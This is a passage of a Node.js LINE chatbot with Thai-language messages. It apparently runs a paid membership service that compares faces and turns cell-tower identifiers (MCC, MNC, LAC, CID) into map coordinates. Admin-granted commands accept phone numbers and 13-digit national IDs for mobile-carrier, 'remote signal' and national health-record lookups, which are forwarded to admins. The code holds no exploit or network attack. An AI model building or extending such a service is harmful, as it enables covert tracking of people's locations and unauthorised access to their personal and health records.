`https://www.giraffai.com/api/v1/getdistance?start_lat=${encodeURIComponent(startLat)}&start_lng=${encodeURIComponent(startLng)}&end_lat=${encodeURIComponent(endLat)}&end_lng=${encodeURIComponent(endLng)}&unit=kilometers`;

const res = await axios.get(apiUrl, {
timeout: 20000,
headers: {
'User-Agent': 'Mozilla/5.0'
}
});

const distance = Number(res.data.distance).toFixed(2);

return reply(event.replyToken, {
type: 'text',
text: formatDistanceResult(startLat, startLng, endLat, endLng, distance)
});

} catch (err) {
console.error('distance lookup error:', err?.response?.data || err.message);

return reply(event.replyToken, {
type: 'text',
text: '❌ คำนวณระยะทางไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
});
}
}

if (event.type === 'message' && event.message.type === 'image') {
  const userId = event.source.userId;
  const session = faceCompareSessions[userId];

  if (!session) return null;

  const dir = path.join(__dirname, 'tmp');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);

  const imagePath = path.join(
    dir,
    `${userId}_${Date.now()}_${session.images.length + 1}.jpg`
  );

  await saveLineImage(event.message.id, imagePath);
  session.images.push(imagePath);

  if (session.images.length === 1) {
    return reply(event.replyToken, {
      type: 'text',
      text: `✅ รับรูปใบหน้าที่ 1 แล้ว

กรุณาส่งรูปใบหน้าที่ 2`
    });
  }

  if (session.images.length === 2) {
    try {
      const result = await compareFaces(session.images[0], session.images[1]);

      delete faceCompareSessions[userId];

      fs.unlinkSync(session.images[0]);
      fs.unlinkSync(session.images[1]);

      return reply(event.replyToken, {
        type: 'text',
        text: formatFaceCompareResult(result)
      });
    } catch (err) {
      delete faceCompareSessions[userId];

      return reply(event.replyToken, {
        type: 'text',
        text: `❌ เปรียบเทียบใบหน้าไม่สำเร็จ

กรุณาตรวจสอบว่ารูปทั้ง 2 รูปมีใบหน้าชัดเจน`
      });
    }
  }
}

}

if (text === 'b!') {
  db.bMode = db.bMode || {};
  db.bMode[userId] = true;
  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text: `กรอกข้อมูลตามนี้แล้วส่งกลับมา:

Location

Received at
GPS
CID
LAC
PLMN
MSISDN
Device status
Recency 0 Minutes
Received
Type 3G/4G/5G`
  });
}

if (db.bMode?.[userId]) {
  delete db.bMode[userId];
  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text: formatBCell(text)
  });
}

if (text.startsWith('ดูสมาชิกรอตรวจสอบ')) {

  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  const page =
    Number(text.split(/\s+/)[1]) || 1;

  return reply(event.replyToken, {
    type: 'text',
    text: buildPendingMembersText(db, page)
  });
}
  const cancelMatch = text.match(/^ยกเลิกสมาชิก#(.+)$/);

  if (cancelMatch) {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
      });
    }

    const phone = cancelMatch[1].trim();
    const result = cancelMemberByPhone(phone);

    if (!result.ok) {
      return reply(event.replyToken, {
        type: 'text',
        text: result.message
      });
    }

    // ✅ กัน error ตรงนี้
    try {
      await push(result.userId, {
        type: 'text',
        text: '❌ บัญชีของคุณถูกยกเลิก หากมีข้อสงสัยกรุณาติดต่อผู้ดูแล'
      });
    } catch (e) {
      console.log('push error:', e.message);
    }

    // ✅ reply จะทำงานแน่นอน
    return reply(event.replyToken, {
      type: 'text',
      text: `✅ ยกเลิกสมาชิกสำเร็จ\nเบอร์: ${phone}\nUID: ${result.userId}`
    });
  }

// =====================================
// ระงับสมาชิก
// ตัวอย่าง: ระงับสมาชิก#0812345678
// =====================================
if (text.startsWith('ระงับสมาชิก#')) {

  // เฉพาะแอดมิน
  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  const phone = text
    .slice('ระงับสมาชิก#'.length)
    .trim()
    .replace(/\D/g, '');

  // ตรวจสอบเบอร์
  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ กรุณาระบุเบอร์สมาชิก 10 หลัก

ตัวอย่าง:
ระงับสมาชิก#0812345678`
    });
  }

  // ค้นหาสมาชิกจากเบอร์
  const memberEntry =
    Object.entries(db.members || {})
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return memberPhone === phone;
      });

  if (!memberEntry) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์: ${phone}`
    });
  }

  const [
    targetUserId,
    targetMember
  ] = memberEntry;

  // ระงับสมาชิก
  targetMember.status = 'suspended';
  targetMember.suspendedAt = nowThai();
  targetMember.suspendedBy = userId;

  db.members[targetUserId] =
    targetMember;

  saveDB(db);

  // แจ้งสมาชิกทันที
  try {

    await push(targetUserId, {
      type: 'text',
      text:
`User ของท่านถูกระงับ
เนื่องจากสิทธิ์หมดอายุ
ต้องการต่ออายุใช้งานติดต่อแอดมิน :
https://line.me/ti/p/mVmD-ncfvU`
    });

  } catch (e) {

    console.log(
      'suspend member push error:',
      e.message
    );
  }

  // แจ้งกลับแอดมิน
  return reply(event.replyToken, {
    type: 'text',
    text:
`✅ ระงับสมาชิกเรียบร้อย

 ${targetMember.fullname || '-'}
 ${phone}
 ${targetUserId}

 สถานะ: ระงับการใช้งาน`
  });
}

if (/^อนุญาติais#/.test(text)) {

  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  const phone = text.replace(/^อนุญาติais#/, '').trim();

  if (!phone) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ กรุณาระบุเบอร์สมาชิก\nตัวอย่าง: อนุญาติais#0812345678'
    });
  }

  db.aisPermissions = db.aisPermissions || {};
  db.aisPermissions[phone] = true;

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text: `✅ อนุญาตเบอร์ ${phone} ใช้ a@ แล้ว`
  });
}

 if (text.startsWith('a#')) {

  const phone = member?.phone || '';

  const allowAis =
    db.aisPermissions &&
    db.aisPermissions[phone];

  if (!allowAis) {
    return reply(event.replyToken, {
      type: 'text',
      text: "สำหรับสมาชิกที่มีสิทธิ์ใช้งาน"
    });
  }

  // ดึงเฉพาะข้อมูลหลัง a#
  const searchNumber = text.slice(2).trim();

  // ต้องเป็นเลข 10 หลัก หรือ 13 หลักเท่านั้น
  if (!/^(\d{10}|\d{13})$/.test(searchNumber)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ รูปแบบคำสั่งไม่ถูกต้อง

ใช้ได้เฉพาะ:
a@ตามด้วยเลข 10 หลัก
หรือ
a@ตามด้วยเลข 13 หลัก

ตัวอย่าง:
a@0812345678
a@1234567890123`
    });
  }

  try {
    const profile = await getProfile(userId);

    for (const adminId of ADMIN_IDS) {
      await push(adminId, {
        type: 'flex',
        altText: "แจ้งเตือนการใช้งานคำสั่ง a@",

        contents: {
          type: 'bubble',
          size: 'mega',

          header: {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#0F172A',
            paddingAll: '18px',

            contents: [
              {
                type: 'text',
                text: " การใช้งานคำสั่ง a@",
                color: '#FFFFFF',
                weight: 'bold',
                size: 'lg'
              },
              {
                type: 'text',
                text: 'สมาชิกที่ได้รับอนุญาต',
                color: '#CBD5E1',
                size: 'sm',
                margin: 'sm'
              }
            ]
          },

          body: {
            type: 'box',
            layout: 'vertical',
            spacing: 'md',
            paddingAll: '18px',

            contents: [
              {
                type: 'text',
                text: " ชื่อ LINE",
                size: 'sm',
                color: '#64748B'
              },
              {
                type: 'text',
                text: profile.displayName || '-',
                weight: 'bold',
                size: 'md',
                wrap: true
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " UID",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },
              {
                type: 'text',
                text: userId,
                size: 'sm',
                weight: 'bold',
                wrap: true
              },

              {
                type: 'button',
                margin: 'sm',
                style: 'secondary',
                height: 'sm',
                action: {
                  type: 'clipboard',
                  label: " คัดลอก UID",
                  clipboardText: userId
                }
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " เบอร์สมาชิก",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },
              {
                type: 'text',
                text: phone || '-',
                weight: 'bold',
                size: 'md'
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " ข้อมูลที่ค้น",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },

              {
                type: 'text',
                text: text,
                weight: 'bold',
                size: 'md',
                wrap: true
              },

              {
                type: 'button',
                margin: 'sm',
                style: 'primary',
                height: 'sm',
                action: {
                  type: 'clipboard',
                  label: " คัดลอกข้อมูลที่ค้น",
                  clipboardText: text
                }
              }
            ]
          }
        }
      });
    }

  } catch (e) {
    console.log('a# notify admin error:', e.message);
  }

  return;
}

// =====================================
// ยกเลิกสิทธิ์ a#
// =====================================
if (text.startsWith('ยกเลิกa#')) {

  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  const phone = text
    .slice('ยกเลิกa#'.length)
    .trim()
    .replace(/\D/g, '');

  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ รูปแบบเบอร์ไม่ถูกต้อง

ตัวอย่าง:
ยกเลิกa#0812345678`
    });
  }

  const targetMember =
    Object.values(db.members || {})
      .find(m =>
        String(m?.phone || '')
          .replace(/\D/g, '') === phone
      );

  if (!targetMember) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์: ${phone}`
    });
  }

  db.aisPermissions =
    db.aisPermissions || {};

  delete db.aisPermissions[phone];

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
` ยกเลิกสิทธิ์ a@ เรียบร้อย

 สมาชิก: ${targetMember.fullname || '-'}
 เบอร์: ${phone}`
  });
}

if (/^อนุญาตfx#/.test(text)) {

  if (!isAdmin(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });
  }

  const phone = text.replace(/^อนุญาตfx#/, '').trim();

  if (!phone) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ กรุณาระบุเบอร์สมาชิก\nตัวอย่าง: อนุญาตfx#0812345678'
    });
  }

  db.fxPermissions = db.fxPermissions || {};
  db.fxPermissions[phone] = true;

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text: `✅ อนุญาตเบอร์ ${phone} ใช้ fx@ แล้ว`
  });
}

if (text.startsWith('fx#')) {

  const phone = member?.phone || '';

  const allowFx =
    db.fxPermissions &&
    db.fxPermissions[phone];

  if (!allowFx) {
    return reply(event.replyToken, {
      type: 'text',
      text: "สำหรับสมาชิกที่มีสิทธิ์ใช้งาน"
    });
  }

  try {
    const profile = await getProfile(userId);

    for (const adminId of ADMIN_IDS) {
      await push(adminId, {
        type: 'flex',
        altText: "แจ้งเตือนการใช้งานคำสั่ง fx@",
        contents: {
          type: 'bubble',
          size: 'mega',

          header: {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#0F172A',
            paddingAll: '18px',
            contents: [
              {
                type: 'text',
                text: " การใช้งานคำสั่ง fx@",
                color: '#FFFFFF',
                weight: 'bold',
                size: 'lg'
              },
              {
                type: 'text',
                text: 'สมาชิกที่ได้รับอนุญาต',
                color: '#CBD5E1',
                size: 'sm',
                margin: 'sm'
              }
            ]
          },

          body: {
            type: 'box',
            layout: 'vertical',
            spacing: 'md',
            paddingAll: '18px',
            contents: [
              {
                type: 'text',
                text: " ชื่อ LINE",
                size: 'sm',
                color: '#64748B'
              },
              {
                type: 'text',
                text: profile.displayName || '-',
                weight: 'bold',
                size: 'md',
                wrap: true
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " UID",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },
              {
                type: 'text',
                text: userId,
                size: 'sm',
                weight: 'bold',
                wrap: true
              },
              {
                type: 'button',
                margin: 'sm',
                style: 'secondary',
                height: 'sm',
                action: {
  type: 'clipboard',
  label: " คัดลอก UID",
  clipboardText: userId
}
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " เบอร์สมาชิก",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },
              {
                type: 'text',
                text: phone || '-',
                weight: 'bold',
                size: 'md'
              },

              {
                type: 'separator',
                margin: 'md'
              },

              {
                type: 'text',
                text: " ข้อมูลที่ค้น",
                size: 'sm',
                color: '#64748B',
                margin: 'md'
              },
              {
                type: 'text',
                text: text,
                weight: 'bold',
                size: 'md',
                wrap: true
              },
              {
                type: 'button',
                margin: 'sm',
                style: 'primary',
                height: 'sm',
                action: {
  type: 'clipboard',
  label: " คัดลอกข้อมูลที่ค้น",
  clipboardText: text
}
              }
            ]
          }
        }
      });
    }

  } catch (e) {
    console.log('fx# notify admin error:', e.message);
  }

  return;
}

// =====================================================
// ยกเลิกสิทธิ์ FX
// ตัวอย่าง: ยกเลิกfx#0812345678
// =====================================================
if (text.startsWith('ยกเลิกfx#')) {

  // เฉพาะแอดมิน
  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  // ดึงเบอร์หลัง #
  const phone = text
    .slice('ยกเลิกfx#'.length)
    .trim()
    .replace(/\D/g, '');

  // ตรวจสอบเบอร์
  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ รูปแบบเบอร์ไม่ถูกต้อง

ตัวอย่าง:
ยกเลิกfx#0812345678`
    });
  }

  // ตรวจว่าสมาชิกมีจริง
  const targetMember =
    Object.values(db.members || {})
      .find(m =>
        String(
          m?.phone ||
          m?.tel ||
          m?.mobile ||
          ''
        )
          .replace(/\D/g, '') === phone
      );

  if (!targetMember) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์: ${phone}`
    });
  }

  // สร้าง object ถ้ายังไม่มี
  db.fxPermissions =
    db.fxPermissions || {};

  // ยกเลิกสิทธิ์
  delete db.fxPermissions[phone];

  // บันทึก
  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
` ยกเลิกสิทธิ์ fx@ เรียบร้อย

 สมาชิก: ${targetMember.fullname || '-'}
 เบอร์: ${phone}

 ไม่สามารถใช้งานคำสั่ง fx@ ได้`
  });
}

// =====================================
// อนุญาตระบบขอข้อมูลสัญญาณ
// รูปแบบ:
// อนุญาตสัญญาณ#0812345678
// =====================================
if (text.startsWith('อนุญาตสัญญาณ#')) {

  // ==============================
  // เฉพาะ ADMIN
  // ==============================
  if (!ADMIN_IDS.includes(userId)) {

    await push(userId, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });

    return;
  }


  // ==============================
  // ดึงเบอร์สมาชิก
  // ==============================
  const phone =
    text
      .slice('อนุญาตสัญญาณ#'.length)
      .trim()
      .replace(/\D/g, '');


  if (!/^0\d{9}$/.test(phone)) {

    await push(userId, {
      type: 'text',
      text:
`❌ รูปแบบไม่ถูกต้อง

กรุณาใช้:
อนุญาตสัญญาณ#เบอร์สมาชิก

ตัวอย่าง:
อนุญาตสัญญาณ#0812345678`
    });

    return;
  }


  // ==============================
  // ค้นหาสมาชิกจากเบอร์
  // ==============================
  const foundMember =
    Object.entries(
      db.members || {}
    ).find(([targetUid, member]) => {

      const memberPhone =
        String(member?.phone || '')
          .replace(/\D/g, '');

      return memberPhone === phone;
    });


  if (!foundMember) {

    await push(userId, {
      type: 'text',
      text:
        `❌ ไม่พบสมาชิกหมายเลข ${phone}`
    });

    return;
  }


  const [
    targetUserId,
    targetMember
  ] = foundMember;


  // ==============================
  // สร้าง Permission Map
  // ==============================
  db.remoteSignalPermissions =
    db.remoteSignalPermissions || {};


  // ==============================
  // เปิดสิทธิ์
  // ==============================
  db.remoteSignalPermissions[
    targetUserId
  ] = true;


  saveDB(db);


  // ==============================
  // แจ้ง ADMIN
  // ==============================
  await push(userId, {

    type: 'text',

    text:
`✅ อนุญาตใช้งานระบบสัญญาณแล้ว

 สมาชิก : ${
  targetMember.lineName ||
  targetMember.displayName ||
  targetMember.fullname ||
  '-'
}
 เบอร์สมาชิก : ${phone}
 UID : ${targetUserId}

 สิทธิ์ขอข้อมูล : มีสิทธิ์ใช้งาน`

  });


  // ==============================
  // แจ้ง MEMBER
  // ==============================
  try {

    await push(targetUserId, {

      type: 'text',

      text:
`✅ ได้รับอนุญาตใช้งานแล้ว

 ระบบขอข้อมูลสัญญาณระยะไกล

สิทธิ์ขอข้อมูล :
✅ มีสิทธิ์ใช้งาน

สามารถเข้าใช้งานระบบได้แล้ว`

    });

  } catch (err) {

    console.error(
      'SIGNAL PERMISSION MEMBER NOTIFY ERROR:',
      err.response?.data ||
      err.message ||
      err
    );

  }


  return;
}

// =====================================
// ยกเลิกสิทธิ์ระบบขอข้อมูลสัญญาณ
// รูปแบบ:
// ยกเลิกสัญญาณ#0812345678
// =====================================
if (text.startsWith('ยกเลิกสัญญาณ#')) {

  // ==============================
  // เฉพาะ ADMIN
  // ==============================
  if (!ADMIN_IDS.includes(userId)) {

    await push(userId, {
      type: 'text',
      text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
    });

    return;
  }


  // ==============================
  // ดึงเบอร์สมาชิก
  // ==============================
  const phone =
    text
      .slice('ยกเลิกสัญญาณ#'.length)
      .trim()
      .replace(/\D/g, '');


  if (!/^0\d{9}$/.test(phone)) {

    await push(userId, {
      type: 'text',
      text:
`❌ รูปแบบไม่ถูกต้อง

กรุณาใช้:
ยกเลิกสัญญาณ#เบอร์สมาชิก

ตัวอย่าง:
ยกเลิกสัญญาณ#0812345678`
    });

    return;
  }


  // ==============================
  // ค้นหาสมาชิก
  // ==============================
  const foundMember =
    Object.entries(
      db.members || {}
    ).find(([targetUid, member]) => {

      const memberPhone =
        String(member?.phone || '')
          .replace(/\D/g, '');

      return memberPhone === phone;
    });


  if (!foundMember) {

    await push(userId, {
      type: 'text',
      text:
        `❌ ไม่พบสมาชิกหมายเลข ${phone}`
    });

    return;
  }


  const [
    targetUserId,
    targetMember
  ] = foundMember;


  db.remoteSignalPermissions =
    db.remoteSignalPermissions || {};


  // ==============================
  // ปิดสิทธิ์
  // ==============================
  delete db.remoteSignalPermissions[
    targetUserId
  ];


  saveDB(db);


  // ==============================
  // แจ้ง ADMIN
  // ==============================
  await push(userId, {

    type: 'text',

    text:
` ยกเลิกสิทธิ์ระบบสัญญาณแล้ว

 สมาชิก : ${
  targetMember.lineName ||
  targetMember.displayName ||
  targetMember.fullname ||
  '-'
}
 เบอร์สมาชิก : ${phone}
 UID : ${targetUserId}

 สิทธิ์ขอข้อมูล : ไม่มีสิทธิ์ใช้งาน`

  });


  // ==============================
  // แจ้ง MEMBER
  // ==============================
  try {

    await push(targetUserId, {

      type: 'text',

      text:
` สิทธิ์ใช้งานถูกยกเลิก

 ระบบขอข้อมูลสัญญาณระยะไกล

สิทธิ์ขอข้อมูล :
 ไม่มีสิทธิ์ใช้งาน

หากมีข้อสงสัย กรุณาติดต่อผู้ดูแลระบบ`

    });

  } catch (err) {

    console.error(
      'SIGNAL REVOKE MEMBER NOTIFY ERROR:',
      err.response?.data ||
      err.message ||
      err
    );

  }


  return;
}

// =====================================
// ADMIN : เพิ่มวันสมาชิกแบบกำหนดเอง
//
// ตัวอย่าง:
// เพิ่มวัน#0827161650#1
// เพิ่มวัน#0827161650#10
// เพิ่มวัน#0827161650#45
// =====================================
if (
  text.startsWith('เพิ่มวัน#')
) {

  // เฉพาะ Admin
  if (!ADMIN_IDS.includes(userId)) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
      }
    );
  }


  const parts =
    text
      .split('#')
      .map(v => v.trim());


  if (parts.length !== 3) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ รูปแบบคำสั่งไม่ถูกต้อง

ตัวอย่าง
เพิ่มวัน#0827161650#1
เพิ่มวัน#0827161650#10
เพิ่มวัน#0827161650#45`
      }
    );
  }


  const phone =
    String(parts[1] || '')
      .replace(/\D/g, '');


  const days =
    Number(parts[2]);


  // ตรวจสอบเบอร์
  if (!/^0\d{9}$/.test(phone)) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ กรุณาระบุเบอร์สมาชิก 10 หลัก'
      }
    );
  }


  // ตรวจจำนวนวัน
  if (
    !Number.isInteger(days) ||
    days <= 0
  ) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ จำนวนวันต้องเป็นเลขจำนวนเต็มมากกว่า 0'
      }
    );
  }


  // ป้องกันพิมพ์ผิดจนเพิ่มมากเกินไป
  if (days > 3650) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ เพิ่มได้สูงสุดครั้งละ 3650 วัน'
      }
    );
  }


  const db =
    loadDB();

  db.members =
    db.members || {};


  // =====================================
  // หา Member จากเบอร์โทร
  // =====================================
  const memberEntry =
    Object.entries(
      db.members
    )
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return (
          memberPhone === phone
        );
      });


  if (!memberEntry) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ ไม่พบสมาชิก

 เบอร์ : ${phone}`
      }
    );
  }


  const [
    targetUserId,
    targetMember
  ] = memberEntry;


  // =====================================
  // คำนวณวันหมดอายุ
  // =====================================

  const now =
    new Date();


  const oldExpire =
    targetMember.expireAt
      ? new Date(
          targetMember.expireAt
        )
      : null;


  let startDate;


  // ถ้ามีวันหมดอายุเดิม
  // และยังไม่หมดอายุ
  // ให้บวกต่อจากวันเดิม
  if (
    oldExpire &&
    !Number.isNaN(
      oldExpire.getTime()
    ) &&
    oldExpire.getTime() >
      now.getTime()
  ) {

    startDate =
      new Date(oldExpire);

  } else {

    // ถ้าหมดแล้ว / ไม่มีวันหมดอายุ
    // เริ่มจากวันนี้
    startDate =
      new Date(now);
  }


  const newExpire =
    new Date(startDate);


  newExpire.setDate(
    newExpire.getDate() +
    days
  );


  // =====================================
  // อัปเดต Member
  // =====================================

  targetMember.status =
    'approved';

  targetMember.expireAt =
    newExpire.toISOString();

  targetMember.updatedAt =
    new Date().toISOString();

  targetMember.lastAddedDays =
    days;


  db.members[targetUserId] =
    targetMember;


  saveDB(db);


  // =====================================
  // แสดงผล
  // =====================================

  const fullName =
    targetMember.fullname ||
    targetMember.fullName ||
    '-';


  const expireText =
    newExpire.toLocaleString(
      'th-TH',
      {
        timeZone:
          'Asia/Bangkok',

        year:
          'numeric',

        month:
          '2-digit',

        day:
          '2-digit',

        hour:
          '2-digit',

        minute:
          '2-digit'
      }
    );


  return reply(
    event.replyToken,
    {
      type: 'text',

      text:
`✅ เพิ่มวันสมาชิกเรียบร้อย

 สมาชิก : ${fullName}
 เบอร์ : ${phone}
 เพิ่ม : ${days} วัน
 หมดอายุ : ${expireText}

UID :
${targetUserId}`
    }
  );
}

if (text.startsWith('อนุญาตสปสช#')) {

  // เฉพาะแอดมินเท่านั้น
  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  // ดึงเบอร์หลัง #
  const phone = text
    .slice('อนุญาตสปสช#'.length)
    .trim()
    .replace(/\D/g, '');

  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
        '❌ รูปแบบเบอร์ไม่ถูกต้อง\n\n' +
        'ตัวอย่าง:\n' +
        'อนุญาตสปสช#0827161650'
    });
  }

  // ตรวจว่ามีสมาชิกเบอร์นี้หรือไม่
  const targetMember = Object.values(db.members || {})
    .find(m => String(m.phone || '').replace(/\D/g, '') === phone);

  if (!targetMember) {
    return reply(event.replyToken, {
      type: 'text',
      text:
        `❌ ไม่พบสมาชิก\n` +
        ` เบอร์: ${phone}`
    });
  }

  // สร้าง object ถ้ายังไม่มี
  if (!db.hPermissions) {
    db.hPermissions = {};
  }

  // ให้สิทธิ์
  db.hPermissions[phone] = true;

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
      `✅ อนุญาตใช้งาน สปสช. เรียบร้อย\n\n` +
      ` สมาชิก: ${targetMember.fullname || '-'}\n` +
      ` เบอร์: ${phone}\n\n` +
      ` สามารถใช้คำสั่ง
` +
      `h@ตามด้วยเลข 13 หลัก`
  });
}

// =====================================================
// ยกเลิกสิทธิ์ สปสช.
// ตัวอย่าง: ยกเลิกสปสช#0812345678
// =====================================================
if (text.startsWith('ยกเลิกสปสช#')) {

  // เฉพาะแอดมิน
  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  // ดึงเบอร์หลัง #
  const phone = text
    .slice('ยกเลิกสปสช#'.length)
    .trim()
    .replace(/\D/g, '');

  // ตรวจสอบเบอร์
  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ รูปแบบเบอร์ไม่ถูกต้อง

ตัวอย่าง:
ยกเลิกสปสช#0812345678`
    });
  }

  // ตรวจว่าสมาชิกมีจริง
  const targetMember =
    Object.values(db.members || {})
      .find(m =>
        String(
          m?.phone ||
          m?.tel ||
          m?.mobile ||
          ''
        )
          .replace(/\D/g, '') === phone
      );

  if (!targetMember) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์: ${phone}`
    });
  }

  // สร้าง object ถ้ายังไม่มี
  db.hPermissions =
    db.hPermissions || {};

  // ยกเลิกสิทธิ์
  delete db.hPermissions[phone];

  // บันทึก
  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
` ยกเลิกสิทธิ์ สปสช. เรียบร้อย

 สมาชิก: ${targetMember.fullname || '-'}
 เบอร์: ${phone}

 ไม่สามารถใช้งานคำสั่ง h@ ได้`
  });
}


if (text.startsWith('h#')) {

  // ดึงเลขหลัง h#
  const number13 =
    text
      .slice(2)
      .trim();

  // ต้องเป็นตัวเลข 13 หลักเท่านั้น
  if (!/^\d{13}$/.test(number13)) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ รูปแบบคำสั่งไม่ถูกต้อง

ตัวอย่าง:
h@1234567890123`
      }
    );
  }


  // เบอร์สมาชิก
  const phone =
    member?.phone || '';


  // ตรวจสิทธิ์ h#
  const allowH =
    db.hPermissions &&
    db.hPermissions[phone];


  if (!allowH) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          'คำสั่งทำการปรับปรุงขออภัยในความไม่สะดวก'
      }
    );
  }


  // =====================================
  // แจ้งแอดมินเมื่อมีการใช้ h#
  // =====================================
  try {

    const profile =
      await getProfile(userId);


    const adminText =
` การใช้งานคำสั่ง h@

สมาชิกที่ได้รับอนุญาต

 ชื่อ LINE
${profile.displayName || '-'}

 UID
${userId}

 เบอร์สมาชิก
${phone || '-'}

 เลขที่ค้น
${number13}`;


    for (
      const adminId of ADMIN_IDS
    ) {

      await push(
        adminId,
        {
          type: 'text',
          text: adminText
        }
      );
    }


  } catch (e) {

    console.log(
      'h# notify admin error:',
      e.message
    );
  }


  return;
}


if (text.startsWith('geo%')) {
  console.log('GEO COMMAND:', text);

  const raw = text.replace('geo%', '').trim();
  const [mcc, mnc, lac, cid] = raw.split(',').map(x => x.trim());

  if (!mcc || !mnc || !lac || !cid) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ รูปแบบไม่ถูกต้อง\nตัวอย่าง:\ngeo@520,4,5609,1631"
    });
  }

  try {
    const data = await googleCellGeo(mcc, mnc, lac, cid);

    return reply(event.replyToken, {
      type: 'text',
      text:
` GOOGLE GEOLOCATION

MCC : ${mcc}
MNC : ${mnc}
LAC : ${lac}
CID : ${cid}

Latitude : ${data.location.lat}
Longitude : ${data.location.lng}
Accuracy : ${data.accuracy} เมตร

 Google Maps
https://maps.google.com/?q=${data.location.lat},${data.location.lng}`
    });

  } catch (err) {
    console.log('GOOGLE GEO ERROR:', err.response?.data || err.message);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ไม่สามารถค้นหาพิกัดได้\nกรุณาตรวจสอบ API KEY หรือข้อมูล MCC/MNC/LAC/CID'
    });
  }
}

if (
  text
    .toLowerCase()
    .trim() === 'support!'
) {
  return reply(
    event.replyToken,
    buildSupportFlex()
  );
}

// =============================
// 🌐 เมนูสาธารณะ ดูได้ทุกคน
// =============================
if (text === 'menu%') {

  return reply(
    event.replyToken,
    [
      {
        type: 'text',
        text: buildMenuText()
      },

      {
        type: 'text',
        
text: buildVehicleTypeMenuText()

      },

      buildWelfareMenuFlex(),

      buildMoneyFlowMenuFlex()
    ]
  );

}

  if (!canUseBotCommands(userId, member, text)) {
    if (!member) {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ยังไม่มีสิทธิ์ใช้งาน\nกรุณาสมัครสมาชิกก่อน โดยพิมพ์: ยินยอมรับข้อตกลง'
      });
    }

